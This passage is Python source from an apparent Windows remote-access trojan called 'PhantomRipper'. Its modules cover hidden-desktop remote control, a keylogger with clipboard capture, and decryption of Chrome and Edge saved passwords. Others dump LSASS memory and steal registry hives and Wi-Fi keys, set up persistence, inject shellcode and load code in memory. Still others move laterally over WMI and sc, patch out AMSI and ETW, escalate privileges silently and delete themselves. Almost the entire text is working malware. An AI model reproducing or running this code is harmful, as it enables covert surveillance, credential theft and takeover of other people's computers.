    try:
        if len(p) == 4:
            x, y, w, h = (int(v) for v in p)
        else:
            x = user32.GetSystemMetrics(76); y = user32.GetSystemMetrics(77)
            w = user32.GetSystemMetrics(78); h = user32.GetSystemMetrics(79)
        raw = _capture_rect(x, y, w, h)
        bmp_header = b"BM" + struct.pack("<IHHI", len(raw) + 54, 0, 0, 54) + struct.pack("<IiiHHIIiiII", 40, w, -h, 1, 32, 0, len(raw), 0, 0, 0, 0)
        data = bmp_header + raw
        post_artifact("screen_%d.bmp" % int(time.time()), data, "screen")
        return "[screenshot] " + _b64(data)
    except Exception as exc:
        return "screen: %s" % exc
//#pragma endmodule


# ---------------------------------------------------------------------------
# live-view channel fallback (core stub; ws module overrides)
# ---------------------------------------------------------------------------
_WS_STATE = {"client": None}


def _ws_send_binary(op, payload):
    return False


//#pragma module hvnc
_HVNC = {"desktop": None, "name": None, "running": False, "thread": None, "fps": 1.0}

if IS_WIN:
    WNDENUMPROC = WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

    class _MOUSEINPUT(Structure):
        _fields_ = [("dx", ctypes.c_long), ("dy", ctypes.c_long), ("mouseData", wintypes.DWORD),
                    ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD), ("dwExtraInfo", POINTER(wintypes.ULONG))]

    class _KEYBDINPUT(Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD), ("dwFlags", wintypes.DWORD),
                    ("time", wintypes.DWORD), ("dwExtraInfo", POINTER(wintypes.ULONG))]

    class _HARDWAREINPUT(Structure):
        _fields_ = [("uMsg", wintypes.DWORD), ("wParamL", wintypes.WORD), ("wParamH", wintypes.WORD)]

    class _INPUT_U(Union):
        _fields_ = [("mi", _MOUSEINPUT), ("ki", _KEYBDINPUT), ("hi", _HARDWAREINPUT)]

    class _INPUT(Structure):
        _anonymous_ = ("u",)
        _fields_ = [("type", wintypes.DWORD), ("u", _INPUT_U)]

    MOUSEEVENTF_MOVE = 0x0001
    MOUSEEVENTF_LEFTDOWN = 0x0002
    MOUSEEVENTF_LEFTUP = 0x0004
    MOUSEEVENTF_RIGHTDOWN = 0x0008
    MOUSEEVENTF_RIGHTUP = 0x0010
    MOUSEEVENTF_WHEEL = 0x0800
    MOUSEEVENTF_ABSOLUTE = 0x8000
    INPUT_MOUSE = 0
    INPUT_KEYBOARD = 1
    KEYEVENTF_KEYUP = 0x0002


def _hvnc_send_frame():
    d = _HVNC
    if not d["desktop"]:
        return False
    prev = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
    if not user32.SetThreadDesktop(d["desktop"]):
        return False
    try:
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 0 or h <= 0:
            return False
        raw = _capture_rect(0, 0, w, h)
        # BGRA -> RGB rows
        b = raw[0::4]; g = raw[1::4]; r = raw[2::4]
        rgb = bytes(v for t in zip(r, g, b) for v in t)
        png = _png_encode(rgb, w, h)
        ok = _ws_send_binary(0x01, png)
        if not ok:
            post_artifact("hvnc_%d.png" % int(time.time() * 1000 % 100000), png, "hvnc")
        return True
    finally:
        user32.SetThreadDesktop(prev)


def _hvnc_loop():
    while _HVNC["running"]:
        try:
            _hvnc_send_frame()
        except Exception:
            pass
        time.sleep(max(0.2, 1.0 / _HVNC["fps"]))


def task_hvnc(args):
    """hvnc start|stop|shot|wins|fps N|click L|R x y|move x y|key <vk>|type <text>|wheel <delta>"""
    if not IS_WIN:
        return "hvnc: windows only"
    parts = args.split(None, 1)
    sub = parts[0].lower() if parts else "status"
    rest = parts[1] if len(parts) > 1 else ""

    if sub == "start":
        if _HVNC["running"]:
            return "hvnc already running"
        dname = "PhDsk" + uuid.uuid4().hex[:6]
        hdesk = user32.CreateDesktopW(dname, None, None, 0, GENERIC_ALL, None)
        if not hdesk:
            return "ERROR: CreateDesktopW failed (%s)" % ctypes.get_last_error()
        si = _STARTUPINFOW()
        si.cb = sizeof(_STARTUPINFOW)
        si.lpDesktop = dname
        pi = _PROCESS_INFO()
        if not kernel32.CreateProcessW(None, "explorer.exe", None, None, False, 0, None, None, byref(si), byref(pi)):
            return "ERROR: explorer spawn on private desktop failed"
        _HVNC["desktop"] = hdesk
        _HVNC["name"] = dname
        _HVNC["running"] = True
        _HVNC["thread"] = threading.Thread(target=_hvnc_loop, daemon=True)
        _HVNC["thread"].start()
        return "hvnc live on desktop %s (fps %.1f)" % (dname, _HVNC["fps"])

    if sub == "stop":
        _HVNC["running"] = False
        return "hvnc stopped"

    if sub == "fps":
        try:
            _HVNC["fps"] = max(0.2, float(rest))
            return "fps %.1f" % _HVNC["fps"]
        except ValueError:
            return "usage: hvnc fps 2"

    if sub == "shot":
        if _HVNC["desktop"] and _hvnc_send_frame():
            return "frame sent"
        return "hvnc not running"

    if sub == "wins":
        prev = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
        user32.SetThreadDesktop(_HVNC["desktop"])
        wins = []

        @WNDENUMPROC
        def _cb(hwnd, lparam):
            if user32.IsWindowVisible(hwnd):
                n = user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(n + 1)
                user32.GetWindowTextW(hwnd, buf, n + 1)
                wins.append("0x%x %s" % (hwnd, buf.value))
            return True
        user32.EnumDesktopWindows(_HVNC["desktop"], _cb, 0)
        user32.SetThreadDesktop(prev)
        return "\n".join(wins) or "(no windows)"

    if not _HVNC["desktop"]:
        return "hvnc not running"

    prev = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
    user32.SetThreadDesktop(_HVNC["desktop"])
    try:
        if sub == "move":
            x, y = (int(v) for v in rest.split()[:2])
            inp = _INPUT(); inp.type = INPUT_MOUSE
            inp.mi = _MOUSEINPUT(x, y, 0, MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, 0, None)
            user32.SendInput(1, byref(inp), sizeof(_INPUT))
            return "moved %s" % rest
        if sub == "click":
            p = rest.split()
            btn = p[0].lower() if p else "l"
            x, y = int(p[1]), int(p[2])
            inp = _INPUT(); inp.type = INPUT_MOUSE
            inp.mi = _MOUSEINPUT(x, y, 0, MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 0, None)
            user32.SendInput(1, byref(inp), sizeof(_INPUT))
            time.sleep(0.03)
            down, up = (MOUSEEVENTF_RIGHTDOWN, MOUSEEVENTF_RIGHTUP) if btn == "r" else (MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP)
            inp.mi = _MOUSEINPUT(0, 0, 0, down, 0, None)
            user32.SendInput(1, byref(inp), sizeof(_INPUT))
            time.sleep(0.03)
            inp.mi = _MOUSEINPUT(0, 0, 0, up, 0, None)
            user32.SendInput(1, byref(inp), sizeof(_INPUT))
            return "clicked %s at %s,%s" % (btn, x, y)
        if sub == "wheel":
            inp = _INPUT(); inp.type = INPUT_MOUSE
            inp.mi = _MOUSEINPUT(0, 0, int(rest), MOUSEEVENTF_WHEEL, 0, None)
            user32.SendInput(1, byref(inp), sizeof(_INPUT))
            return "wheel %s" % rest
        if sub == "key":
            vk = int(rest, 0)
            for flags in (0, KEYEVENTF_KEYUP):
                inp = _INPUT(); inp.type = INPUT_KEYBOARD
                inp.ki = _KEYBDINPUT(vk, 0, flags, 0, None)
                user32.SendInput(1, byref(inp), sizeof(_INPUT))
            return "key 0x%x" % vk
        if sub == "type":
            for ch in rest:
                vk = user32.VkKeyScanW(ord(ch)) & 0xFF
                for flags in (0, KEYEVENTF_KEYUP):
                    inp = _INPUT(); inp.type = INPUT_KEYBOARD
                    inp.ki = _KEYBDINPUT(vk, 0, flags, 0, None)
                    user32.SendInput(1, byref(inp), sizeof(_INPUT))
            return "typed %d chars" % len(rest)
        return "unknown hvnc sub: %s" % sub
    finally:
        user32.SetThreadDesktop(prev)
//#pragma endmodule


//#pragma module keylog
_KL = {"active": False, "buf": [], "lock": threading.Lock(), "thread": None, "hook": None}

if IS_WIN:
    class _KBDLLHOOKSTRUCT(Structure):
        _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                    ("dwExtraInfo", POINTER(wintypes.ULONG))]

    HOOKPROC = WINFUNCTYPE(ctypes.c_longlong, c_int, wintypes.WPARAM, wintypes.LPARAM)
    WH_KEYBOARD_LL = 13
    WM_QUIT = 0x0012


def _key_cb(ncode, wparam, lparam):
    if ncode == 0 and wparam in (0x0100, 0x0104):  # WM_KEYDOWN / SYSKEYDOWN
        ks = ctypes.cast(lparam, POINTER(_KBDLLHOOKSTRUCT)).contents
        title = ctypes.create_unicode_buffer(256)
        hwnd = user32.GetForegroundWindow()
        user32.GetWindowTextW(hwnd, title, 256)
        ch = _vk_to_char(ks.vkCode)
        stamp = time.strftime("%H:%M:%S")
        with _KL["lock"]:
            _KL["buf"].append("[%s][%s]%s" % (stamp, title.value, ch if ch else "<%x>" % ks.vkCode))
            if len(_KL["buf"]) > 5000:
                del _KL["buf"][:len(_KL["buf"]) - 5000]
    return user32.CallNextHookEx(None, ncode, wparam, lparam)


def _vk_to_char(vk):
    buf = ctypes.create_unicode_buffer(8)
    state = (wintypes.BYTE * 256)()
    user32.GetKeyboardState(state)
    layout = user32.GetKeyboardLayout(0)
    n = user32.ToUnicodeEx(vk, 0, state, buf, 8, 0, layout)
    return buf.value if n > 0 else ""


def _keylog_thread():
    _KL["hook"] = user32.SetWindowsHookExW(WH_KEYBOARD_LL, HOOKPROC(_key_cb), None, 0)
    msg = wintypes.MSG()
    while _KL["active"] and user32.GetMessageW(byref(msg), None, 0, 0) > 0:
        pass
    if _KL["hook"]:
        user32.UnhookWindowsHookEx(_KL["hook"])
        _KL["hook"] = None


def task_keylog(args):
    if not IS_WIN:
        return "keylog: windows only"
    sub = args.strip().lower() or "dump"
    if sub == "start":
        if _KL["active"]:
            return "keylog already running"
        _KL["active"] = True
        _KL["thread"] = threading.Thread(target=_keylog_thread, daemon=True)
        _KL["thread"].start()
        return "keylog started"
    if sub == "stop":
        _KL["active"] = False
        try:
            user32.PostThreadMessageW(_KL["thread"].ident, WM_QUIT, 0, 0)
        except Exception:
            pass
        return "keylog stopped"
    if sub == "dump":
        with _KL["lock"]:
            data = "".join(_KL["buf"])
            _KL["buf"].clear()
        return data or "(empty)"
    if sub == "clip":
        return _clipboard_get()
    return "keylog: start|stop|dump|clip"


def _clipboard_get():
    if not user32.OpenClipboard(None):
        return "(clipboard busy)"
    try:
        h = user32.GetClipboardData(13)  # CF_UNICODETEXT
        if not h:
            return "(no text)"
        ptr = kernel32.GlobalLock(h)
        if not ptr:
            return "(lock failed)"
        text = ctypes.wstring_at(ptr)
        kernel32.GlobalUnlock(h)
        return text or "(empty)"
    finally:
        user32.CloseClipboard()
//#pragma endmodule


//#pragma module creds
def _dpapi_unprotect(blob):
    class DATA_BLOB(Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_ubyte))]
    inp = DATA_BLOB(len(blob), ctypes.cast(ctypes.create_string_buffer(blob, len(blob)), POINTER(c_ubyte)))
    out = DATA_BLOB()
    if not crypt32.CryptUnprotectData(byref(inp), None, None, None, None, 0, byref(out)):
        return None
    try:
        return ctypes.string_at(out.pbData, out.cbData)
    finally:
        kernel32.LocalFree(out.pbData)


def _aes_gcm_decrypt(key, nonce, ct):
    """Pure-python AES-256-CTR decrypt of a GCM ciphertext (tag unchecked)."""
    sbox = _AES_SBOX()

    def xt(a):
        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1)

    def key_expansion(k):
        rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40]
        nk = 8
        w = [list(k[i * 4:i * 4 + 4]) for i in range(nk)]
        for i in range(nk, 4 * (14 + 1)):
            t = list(w[i - 1])
            if i % nk == 0:
                t = t[1:] + t[:1]
                t = [sbox[b] for b in t]
                t[0] ^= rcon[i // nk - 1]
            elif i % nk == 4:
                t = [sbox[b] for b in t]
            w.append([w[i - nk][j] ^ t[j] for j in range(4)])
        return [[w[r * 4 + c] for c in range(4)] for r in range(15)]

    def add_round_key(s, wk):
        for i in range(16):
            s[i] ^= wk[i // 4][i % 4]

    def encrypt_block(block, round_keys):
        s = list(block)
        add_round_key(s, round_keys[0])
        for rnd in range(1, 14):
            s = [sbox[b] for b in s]
            s = [s[0], s[5], s[10], s[15], s[4], s[9], s[14], s[3], s[8], s[13], s[2], s[7], s[12], s[1], s[6], s[11]]
            t = list(s)
            for c in range(4):
                a = (t[c * 4:(c + 1) * 4])
                s[c * 4 + 0] = xt(a[0]) ^ xt(a[1]) ^ a[1] ^ a[2] ^ a[3]
                s[c * 4 + 1] = a[0] ^ xt(a[1]) ^ xt(a[2]) ^ a[2] ^ a[3]
                s[c * 4 + 2] = a[0] ^ a[1] ^ xt(a[2]) ^ xt(a[3]) ^ a[3]
                s[c * 4 + 3] = xt(a[0]) ^ a[0] ^ a[1] ^ a[2] ^ xt(a[3])
            add_round_key(s, round_keys[rnd])
        s = [sbox[b] for b in s]
        s = [s[0], s[5], s[10], s[15], s[4], s[9], s[14], s[3], s[8], s[13], s[2], s[7], s[12], s[1], s[6], s[11]]
        add_round_key(s, round_keys[14])
        return bytes(s)

    rk = key_expansion(key)
    counter = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")
    out = bytearray()
    for i in range(0, len(ct), 16):
        ctr_block = ((counter + 1 + i // 16) % (1 << 128)).to_bytes(16, "big")
        ks = encrypt_block(ctr_block, rk)
        out += bytes(a ^ b for a, b in zip(ct[i:i + 16], ks))
    return bytes(out)


def _build_sbox():
    def xt(a):
        return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else (a << 1)
    x = 1
    exp = [0] * 255
    log = [0] * 256
    for i in range(255):
        exp[i] = x
        log[x] = i
        x = x ^ xt(x)  # *=3
    sbox = [0] * 256
    for i in range(256):
        b = 0 if i == 0 else exp[(255 - log[i]) % 255]
        s = b
        for _ in range(4):
            b = ((b << 1) | (b >> 7)) & 0xFF
            s ^= b
        sbox[i] = s ^ 0x63
    return bytes(sbox)


_AES_SBOX = _build_sbox


def _chrome_profile_creds(base, browser):
    out = []
    local_state = os.path.join(base, "Local State")
    login_data = os.path.join(base, "Default", "Login Data")
    cookies_db = os.path.join(base, "Default", "Cookies")
    if not os.path.exists(local_state) or not os.path.exists(login_data):
        return ["%s: profile not found" % browser]
    try:
        key = None
        js = json.load(open(local_state, "r", encoding="utf-8"))
        enc = base64.b64decode(js["os_crypt"]["encrypted_key"])
        if enc[:5] == b"DPAPI":
            key = _dpapi_unprotect(enc[5:])
        import sqlite3
        tmp = _tempfile(".db")
        open(login_data, "rb").read()  # touch
        with open(login_data, "rb") as f:
            data = f.read()
        open(tmp, "wb").write(data)
        con = sqlite3.connect(tmp)
        rows = con.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
        con.close()
        os.remove(tmp)
        if key:
            for url, user, pw in rows:
                if pw[:3] in (b"v10", b"v11"):
                    try:
                        dec = _aes_gcm_decrypt(key, pw[3:15], pw[15:-16])
                        out.append("%s | %s | %s" % (url, user, dec.decode("utf-8", "replace")))
                    except Exception:
                        out.append("%s | %s | <decrypt failed>" % (url, user))
                elif pw[:3] == b"v20":
                    out.append("%s | %s | <app-bound>" % (url, user))
                else:
                    r = _dpapi_unprotect(pw)
                    out.append("%s | %s | %s" % (url, user, r.decode("utf-8", "replace") if r else "<dpapi failed>"))
        return out or ["%s: no saved logins" % browser]
    except Exception as exc:
        return ["%s: ERROR %s" % (browser, exc)]


def task_lsass(args):
    if not IS_WIN:
        return "lsass: windows only"
    if _privilege() not in ("admin", "system"):
        return "lsass: needs admin (run uac/getsys first)"
    import winreg as _w
    _enable_priv(SE_DEBUG)
    targets = _find_pids("lsass.exe")
    if not targets:
        return "lsass: not found"
    pid = targets[0]
    hproc = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not hproc:
        return "lsass: OpenProcess denied (PPL likely)"
    path = os.path.join(os.environ.get("TEMP", agent_dir()), "%s.dmp" % uuid.uuid4().hex[:8])
    hfile = kernel32.CreateFileW(path, 0x40000000, 0, None, 2, 0, None)
    if hfile == INVALID_HANDLE_VALUE or hfile == -1:
        return "lsass: CreateFileW failed"
    dbghelp = ctypes.WinDLL("dbghelp")
    ok = dbghelp.MiniDumpWriteDump(hproc, pid, hfile, 0, None, None, None)
    kernel32.CloseHandle(hfile)
    kernel32.CloseHandle(hproc)
    if not ok:
        try:
            os.remove(path)
        except Exception:
            pass
        return "lsass: MiniDumpWriteDump failed (PPL? try BYOVD)"
    try:
        data = open(path, "rb").read()
        os.remove(path)
        short = "lsass_%d.dmp" % pid
        post_artifact(short, data, "lsass")
        return "lsass dump: %d bytes uploaded as %s" % (len(data), short)
    except Exception as exc:
        return "lsass: upload failed %s" % exc


def task_hives(args):
    if not IS_WIN:
        return "hives: windows only"
    outdir = agent_dir()
    outs = []
    for hname, key in (("SAM", "HKLM\\SAM"), ("SYSTEM", "HKLM\\SYSTEM"), ("SECURITY", "HKLM\\SECURITY")):
        p = os.path.join(outdir, ".%s.hiv" % hname.lower())
        r = _run('reg save "%s" "%s" /y' % (key, p), timeout=30)
        if os.path.exists(p):
            data = open(p, "rb").read()
            os.remove(p)
            post_artifact("%s.hiv" % hname.lower(), data, "hive")
            outs.append("%s: %d B uploaded" % (hname, len(data)))
        else:
            outs.append("%s: failed (%s)" % (hname, r.strip().splitlines()[-1] if r.strip() else "?"))
    return "\n".join(outs)


def task_wifi(args):
    if not IS_WIN:
        return "wifi: windows only"
    r = _run("netsh wlan show profiles", timeout=20)
    profiles = re.findall(r"All User Profile\s*:\s*(.+)", r)
    outs = []
    for p in profiles:
        p = p.strip()
        k = _run('netsh wlan show profile name="%s" key=clear' % p, timeout=20)
        m = re.search(r"Key Content\s*:\s*(.+)", k)
        outs.append("%s : %s" % (p, m.group(1).strip() if m else "(none)"))
    return "\n".join(outs) or "(no wifi profiles)"


def task_chrome(args):
    if not IS_WIN:
        return "chrome: windows only"
    local = os.environ.get("LOCALAPPDATA", "")
    outs = []
    for browser, sub in (("chrome", r"Google\Chrome\User Data"), ("edge", r"Microsoft\Edge\User Data")):
        base = os.path.join(local, sub)
        outs += _chrome_profile_creds(base, browser)
    return "\n".join(outs)


def task_dpapi(args):
    r = _dpapi_unprotect(base64.b64decode(args))
    return _b64(r) if r else "dpapi: failed"


def task_creds(args):
    sub = args.strip().lower()
    if sub.startswith("lsass"):
        return task_lsass("")
    if sub.startswith("chrome") or sub.startswith("edge") or sub.startswith("browser"):
        return task_chrome("")
    if sub.startswith("wifi"):
        return task_wifi("")
    if sub.startswith("hives") or sub.startswith("sam"):
        return task_hives("")
    if sub.startswith("dpapi "):
        return task_dpapi(args[6:])
    return "creds: lsass|chrome|wifi|hives|dpapi <b64>"
//#pragma endmodule


//#pragma module persist
def task_persist(args):
    if not IS_WIN:
        exe = sys.executable if getattr(sys, "frozen", False) else __file__
        line = "\n(python3 %s &) &\n" % exe
        with open(os.path.expanduser("~/.bashrc"), "a") as fh:
            fh.write(line)
        return "persist: bashrc updated"
    sub = args.split(None, 1)
    mode = sub[0].lower() if sub else "run"
    exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
    py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
    me = os.path.abspath(sys.argv[0])
    cmdline = '%s"%s" --elevated' % (py, me)
    import winreg
    if mode == "run":
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "PhantomRipper", 0, winreg.REG_SZ, cmdline)
        winreg.CloseKey(k)
        return "persist: HKCU Run set"
    if mode == "hklm" and ctypes.windll.shell32.IsUserAnAdmin():
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "PhantomRipper", 0, winreg.REG_SZ, cmdline)
        winreg.CloseKey(k)
        return "persist: HKLM Run set"
    if mode == "task" and ctypes.windll.shell32.IsUserAnAdmin():
        tname = "PhantomUpdate" + uuid.uuid4().hex[:4]
        r = _run('schtasks /create /tn %s /ru SYSTEM /sc onlogon /tr "%s" /f' % (tname, cmdline))
        return "persist: SYSTEM task %s (%s)" % (tname, r.strip().splitlines()[-1] if r else "?")
    if mode == "service" and ctypes.windll.shell32.IsUserAnAdmin():
        sname = "PhantomSvc" + uuid.uuid4().hex[:4]
        r = _run('sc create %s binPath= "%s" start= auto displayname= "Phantom Update Service"' % (sname, cmdline))
        _run("sc start %s" % sname)
        return "persist: service %s" % sname
    if mode == "wmi" and ctypes.windll.shell32.IsUserAnAdmin():
        script = ("$f='%s';$a='%s';$t=New-ScheduledTaskAction -Execute $f -Argument $a;"
                  "$tr=New-ScheduledTaskTrigger -AtLogOn;"
                  "Register-CimInstance -ClassName __EventFilter -Namespace root\\subscription -Property @{Name='PhFilter';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"} | Out-Null;"
                  % (exe, me))
        return "persist: wmi (use runps) — " + _run('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v PhantomWMI /d "%s" /f' % cmdline)
    if mode == "startup":
        startup = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
        link = os.path.join(startup, "phantom.bat")
        with open(link, "w") as fh:
            fh.write('@echo off\r\nstart "" %s\r\n' % cmdline)
        return "persist: startup folder .bat"
    if mode == "remove":
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, "PhantomRipper")
            winreg.CloseKey(k)
            return "persist removed"
        except Exception as exc:
            return "persist remove: %s" % exc
    return "persist: run|hklm|task|service|wmi|startup|remove (admin for hklm/task/service/wmi)"
//#pragma endmodule


//#pragma module exec
def task_exec(args):
    """exec <hex shellcode> — local thread. inject <pid> <hex> for remote."""
    try:
        sc = bytes.fromhex(args.replace(" ", "").replace("\\x", ""))
    except ValueError:
        return "exec: hex required"
    if not IS_WIN:
        import mmap
        m = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        m.write(sc)
        addr = ctypes.addressof(ctypes.c_char.from_buffer(m))
        t = threading.Thread(target=lambda: ctypes.CFUNCTYPE(None)(addr)(), daemon=True)
        t.start()
        return "exec: %d bytes via mmap thread" % len(sc)
    addr = kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
    if not addr:
        return "exec: VirtualAlloc failed"
    ctypes.memmove(addr, sc, len(sc))
    kernel32.VirtualProtect(addr, len(sc), 0x20, byref(wintypes.DWORD()))
    tid = wintypes.DWORD()
    h = kernel32.CreateThread(None, 0, addr, None, 0, byref(tid))
    if not h:
        return "exec: CreateThread failed"
    return "exec: %d bytes running (tid %s)" % (len(sc), tid.value)
//#pragma endmodule


//#pragma module inject
def task_inject(args):
    """inject <pid> <hex shellcode>"""
    if not IS_WIN:
        return "inject: windows only"
    p = args.split(None, 1)
    if len(p) < 2:
        return "usage: inject <pid> <hex>"
    try:
        pid = int(p[0])
        sc = bytes.fromhex(p[1].replace(" ", "").replace("\\x", ""))
    except ValueError:
        return "inject: bad args"
    _enable_priv(SE_DEBUG)
    hproc = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not hproc:
        return "inject: OpenProcess failed (try as admin/system)"
    addr = kernel32.VirtualAllocEx(hproc, None, len(sc), 0x3000, 0x40)
    if not addr:
        kernel32.CloseHandle(hproc)
        return "inject: VirtualAllocEx failed"
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(hproc, addr, sc, len(sc), byref(written))
    tid = wintypes.DWORD()
    h = kernel32.CreateRemoteThread(hproc, None, 0, addr, None, 0, byref(tid))
    kernel32.CloseHandle(hproc)
    if not h:
        return "inject: CreateRemoteThread failed"
    return "inject: %d bytes into pid %s (tid %s)" % (written.value, pid, tid.value)
//#pragma endmodule


//#pragma module pymod
def task_pymod(args):
    """pymod <b64(zlib(python source))> — in-memory module exec, no disk."""
    try:
        src = zlib.decompress(base64.b64decode(args)).decode("utf-8")
    except Exception as exc:
        return "pymod: %s" % exc
    buf = io.StringIO()
    try:
        g = {"__name__": "phantom_module", "post_artifact": post_artifact,
             "run": _run, "agent_dir": agent_dir, "SESSION_ID": SESSION_ID}
        old = sys.stdout
        sys.stdout = buf
        exec(compile(src, "<phantom>", "exec"), g)
        sys.stdout = old
    except Exception as exc:
        sys.stdout = old
        return "pymod error: %s\n%s" % (exc, buf.getvalue())
    return buf.getvalue() or "(module ok)"
//#pragma endmodule


//#pragma module lateral
def task_lateral(args):
    """wmi <host> <cmd> | sc <host> <cmd>  (needs admin shares / creds)"""
    parts = args.split(None, 2)
    if len(parts) < 3:
        return "usage: wmi|sc <host> <command>"
    how, host, cmd = parts
    if how == "wmi":
        ps = ("$c = New-CimSession -ComputerName %s; "
              "Invoke-CimMethod -CimSession $c -ClassName Win32_Process -MethodName Create "
              "-Arguments @{CommandLine='%s'}" % (host, cmd.replace("'", "''")))
        return task_runps(ps)
    if how == "sc":
        binp = "cmd.exe /c %s" % cmd
        r1 = _run('sc \\%s create PhantomX binPath= "%s"' % (host, binp))
        r2 = _run('sc \\%s start PhantomX' % host)
        _run('sc \\%s delete PhantomX' % host)
        return r1 + "\n" + r2
    return "unknown method"
//#pragma endmodule


//#pragma module net  (runps / amsi+etw patched powershell)
_AMSI_PATCH = (
    "$w='NonPublic,Static';$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
    "$t.GetField('amsiInitFailed',$w).SetValue($null,$true);"
    "$etw=[System.Management.Automation.PSEtwLogProvider];"
    "$g=$etw.GetField('etwProvider',$w);$m=[System.Diagnostics.Eventing.EventProvider];"
    "$m.GetField('m_enabled',$w).SetValue($g.GetValue($null),0);"
)


def task_runps(script):
    if not IS_WIN:
        return "runps: windows only"
    full = _AMSI_PATCH + script
    enc = base64.b64encode(full.encode("utf-16-le")).decode()
    r = _run(["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Enc", enc], timeout=180, shell=False)
    return r
//#pragma endmodule


//#pragma module file  (legacy kept in core)
def _send_file(path):
    if not os.path.exists(path):
        return "ERROR: file not found: %s" % path
    try:
        data = open(path, "rb").read()
    except Exception as exc:
        return "ERROR: %s" % exc
    post_artifact(os.path.basename(path), data, "exfil")
    return "[file:%s] (%d B uploaded)" % (path, len(data))


def _recv_file(spec):
    if ":" not in spec:
        return "ERROR: upload requires dest:b64data"
    dest, b64 = spec.split(":", 1)
    data = base64.b64decode(b64)
    with open(dest, "wb") as fh:
        fh.write(data)
    return "uploaded %d bytes to %s" % (len(data), dest)
//#pragma endmodule


//#pragma module selfdestruct
def task_die(args):
    try:
        task_persist("remove")
    except Exception:
        pass
    try:
        if IS_WIN:
            exe = sys.executable if getattr(sys, "frozen", False) else None
            target = os.path.abspath(sys.argv[0])
            if getattr(sys, "frozen", False):
                target = os.path.abspath(sys.executable)
            bat = _tempfile(".bat")
            with open(bat, "w") as fh:
                fh.write('@echo off\r\ntimeout /t 2 /nobreak >nul\r\ndel /f /q "%s"\r\ndel /f /q "%s"\r\n' % (target, bat))
            subprocess.Popen(["cmd.exe", "/c", bat], creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass
    os._exit(0)
//#pragma endmodule


//#pragma module autoesc
def _auto_escalate():
    """Silent climb on first contact: UAC bypass if needed, then SYSTEM chain."""
    try:
        priv = _privilege()
        if priv == "system":
            return
        if priv != "admin":
            task_uac("")
            time.sleep(6)
        task_getsys("auto")
    except Exception:
        pass
//#pragma endmodule


//#pragma module pe
# Fileless in-memory PE loader: AES-256-CTR encrypted PE arrives inside the
# task itself, decrypts in memory, maps with relocations + import resolution,
# runs from a thread. Nothing touches disk; nothing is written but memory.

if IS_WIN:
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.LoadLibraryA.restype = ctypes.c_void_p
    kernel32.LoadLibraryA.argtypes = [ctypes.c_char_p]

    def _pe_walk_imports(base, imp_rva, is64):
        tsize = 8 if is64 else 4
        idx = 0
        loaded = []
        while True:
            desc = base + imp_rva + idx * 20
            oft, _ts, _fc, name_rva, ft = struct.unpack("<IIIII", ctypes.string_at(desc, 20))
            if oft == 0 and name_rva == 0 and ft == 0:
                break
            if name_rva:
                dll_name = ctypes.string_at(base + name_rva).split(b"\x00")[0]
                hmod = kernel32.LoadLibraryA(dll_name)
                if not hmod:
                    loaded.append("<missing %s>" % dll_name.decode("latin1"))
                    idx += 1
                    continue
                lookup = base + (oft if oft else ft)
                iat = base + ft
                j = 0
                while True:
                    val = int.from_bytes(ctypes.string_at(lookup + j * tsize, tsize), "little")
                    if val == 0:
                        break
                    if is64:
                        if val & 0x8000000000000000:
                            func = kernel32.GetProcAddress(hmod, val & 0xFFFF)
                        else:
                            fname = ctypes.string_at(base + val + 2)
                            func = kernel32.GetProcAddress(hmod, fname)
                        slot = struct.pack("<Q", func or 0)
                    else:
                        if val & 0x80000000:
                            func = kernel32.GetProcAddress(hmod, val & 0xFFFF)
                        else:
                            fname = ctypes.string_at(base + val + 2)
                            func = kernel32.GetProcAddress(hmod, fname)
                        slot = struct.pack("<I", func or 0)
                    ctypes.memmove(iat + j * tsize, slot, tsize)
                    j += 1
                loaded.append("%s(%d)" % (dll_name.decode("latin1"), j))
            idx += 1
        return loaded

